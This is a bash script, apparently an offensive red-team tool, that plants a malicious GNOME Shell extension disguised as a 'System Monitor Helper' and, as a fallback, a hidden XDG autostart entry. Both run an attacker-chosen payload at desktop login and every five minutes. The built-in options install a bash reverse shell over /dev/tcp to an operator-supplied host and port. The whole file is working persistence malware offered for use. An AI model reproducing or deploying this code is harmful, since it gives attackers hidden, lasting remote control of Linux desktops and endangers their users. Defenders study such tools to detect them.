#!/bin/bash
# GNOME Shell Extension Persistence (T1546)
# Deploys a malicious GNOME extension that fires on desktop login
# Based on EvilGnome APT technique (Gamaredon group)

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_gnome"
EXT_UUID="system-monitor-helper@gnome-extensions.org"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║    GNOME Shell Extension Persistence (T1546)         ║"
    echo " ║  EvilGnome APT technique — fires on desktop login    ║"
    echo " ║  Targets: GNOME 3.x / 4x, Ubuntu, Fedora, Debian    ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

detect_gnome() {
    if ! command -v gnome-shell >/dev/null 2>&1 && [ -z "$GNOME_DESKTOP_SESSION_ID" ] && \
       [ "$(echo "$XDG_CURRENT_DESKTOP" | grep -i gnome)" = "" ]; then
        echo -e "${YELLOW}[!] GNOME not detected, but installing anyway${NC}"
    else
        local VER; VER=$(gnome-shell --version 2>/dev/null | awk '{print $3}')
        echo -e "${GREEN}[+] GNOME Shell detected: ${VER}${NC}"
    fi
}

get_gnome_version_range() {
    local VER; VER=$(gnome-shell --version 2>/dev/null | awk '{print $3}' | cut -d. -f1)
    VER="${VER:-45}"
    if [ "$VER" -ge 45 ] 2>/dev/null; then
        echo "45.0"
    elif [ "$VER" -ge 40 ] 2>/dev/null; then
        echo "40.0"
    else
        echo "3.36.0"
    fi
}

install_extension() {
    local TARGET_USER="$1" PAYLOAD="$2"
    local HD; HD=$(getent passwd "$TARGET_USER" 2>/dev/null | cut -d: -f6)
    [ -z "$HD" ] && { echo -e "${RED}[-] User not found: ${TARGET_USER}${NC}"; return; }

    local EXTDIR="${HD}/.local/share/gnome-shell/extensions/${EXT_UUID}"
    mkdir -p "$EXTDIR"

    local GNOME_MIN; GNOME_MIN=$(get_gnome_version_range)

    # metadata.json — makes the extension look legitimate
    cat > "${EXTDIR}/metadata.json" << EOF
{
  "name": "System Monitor Helper",
  "description": "Monitors system performance and resources",
  "uuid": "${EXT_UUID}",
  "version": 3,
  "shell-version": ["${GNOME_MIN}", "$(echo "$GNOME_MIN" | cut -d. -f1).1"],
  "_marker": "${MARKER}"
}
EOF

    # extension.js — the actual malicious code
    cat > "${EXTDIR}/extension.js" << JSEOF
// System Monitor Helper Extension
// ${MARKER}
const GLib = imports.gi.GLib;

let _timeout = null;

function _execute() {
    try {
        GLib.spawn_command_line_async('bash -c "${PAYLOAD}"');
    } catch(e) {}
}

function init() {}

function enable() {
    // Fire immediately on enable, then every 5 minutes as keepalive
    _execute();
    _timeout = GLib.timeout_add_seconds(GLib.PRIORITY_DEFAULT, 300, function() {
        _execute();
        return GLib.SOURCE_CONTINUE;
    });
}

function disable() {
    if (_timeout) {
        GLib.Source.remove(_timeout);
        _timeout = null;
    }
}
JSEOF

    chown -R "${TARGET_USER}:" "$EXTDIR" 2>/dev/null
    chmod 644 "${EXTDIR}/metadata.json" "${EXTDIR}/extension.js"

    echo -e "${GREEN}[+] Extension installed: ${EXTDIR}${NC}"
    echo -e "${YELLOW}[!] Enable via: gnome-extensions enable ${EXT_UUID}${NC}"
    echo -e "${YELLOW}[!] Or auto-enable by modifying dconf settings below${NC}"
}

enable_extension_dconf() {
    local TARGET_USER="$1"
    # Enable extension in dconf database (requires running as the target user)
    if [ "$(id -un)" = "$TARGET_USER" ] || [ "$EUID" = "0" ]; then
        local DCONF_CMD="dconf write /org/gnome/shell/enabled-extensions"
        if command -v gnome-extensions >/dev/null 2>&1; then
            sudo -u "$TARGET_USER" gnome-extensions enable "$EXT_UUID" 2>/dev/null && \
                echo -e "${GREEN}[+] Extension enabled via gnome-extensions${NC}" && return
        fi
        echo -e "${YELLOW}[!] Manual enable: run as ${TARGET_USER}:${NC}"
        echo -e "  gnome-extensions enable ${EXT_UUID}"
        echo -e "  or: dconf write /org/gnome/shell/enabled-extensions \"['${EXT_UUID}']\""
    fi
}

install_autostart_fallback() {
    # Fallback: XDG autostart to load extension manually if dconf is unavailable
    local TARGET_USER="$1" PAYLOAD="$2"
    local HD; HD=$(getent passwd "$TARGET_USER" 2>/dev/null | cut -d: -f6)
    [ -z "$HD" ] && return

    mkdir -p "${HD}/.config/autostart"
    cat > "${HD}/.config/autostart/gnome-extensions-update.desktop" << EOF
[Desktop Entry]
# ${MARKER}
Type=Application
Name=GNOME Extensions Updater
Exec=bash -c "${PAYLOAD}"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
    chown "${TARGET_USER}:" "${HD}/.config/autostart/gnome-extensions-update.desktop" 2>/dev/null
    echo -e "${GREEN}[+] XDG autostart fallback installed${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] Installed extensions:${NC}"
    find /home /root -path "*/gnome-shell/extensions/*" -name "metadata.json" 2>/dev/null | \
        xargs grep -l "$MARKER" 2>/dev/null | while read -r f; do
            echo "  $(dirname "$f")"
        done
    echo -e "${YELLOW}[*] Autostart fallbacks:${NC}"
    find /home /root -name "gnome-extensions-update.desktop" 2>/dev/null | while read -r f; do
        grep -q "$MARKER" "$f" 2>/dev/null && echo "  $f"
    done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    find /home /root -path "*/${EXT_UUID}" -type d 2>/dev/null | while read -r d; do
        grep -q "$MARKER" "${d}/metadata.json" 2>/dev/null && rm -rf "$d" && echo -e "${GREEN}[+] Removed: ${d}${NC}"
    done
    find /home /root -name "gnome-extensions-update.desktop" 2>/dev/null | while read -r f; do
        grep -q "$MARKER" "$f" 2>/dev/null && rm -f "$f"
    done
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner
detect_gnome

echo -e "  ${YELLOW}[1]${NC} Install extension (reverse shell)"
echo -e "  ${YELLOW}[2]${NC} Install extension (custom command)"
echo -e "  ${YELLOW}[3]${NC} Enable installed extension"
echo -e "  ${YELLOW}[4]${NC} Install XDG autostart fallback"
echo -e "  ${YELLOW}[5]${NC} List installed"
echo -e "  ${YELLOW}[6]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        read -rp "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        install_extension "$USR" "$PAYLOAD"
        enable_extension_dconf "$USR"
        ;;
    2)
        read -rp "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"
        read -rp "Command: " CMD
        install_extension "$USR" "$CMD"
        enable_extension_dconf "$USR"
        ;;
    3)
        read -rp "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"
        enable_extension_dconf "$USR"
        ;;
    4)
        read -rp "Target user [$(whoami)]: " USR; USR="${USR:-$(whoami)}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
        install_autostart_fallback "$USR" "$PAYLOAD"
        ;;
    5) list_installed ;;
    6) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
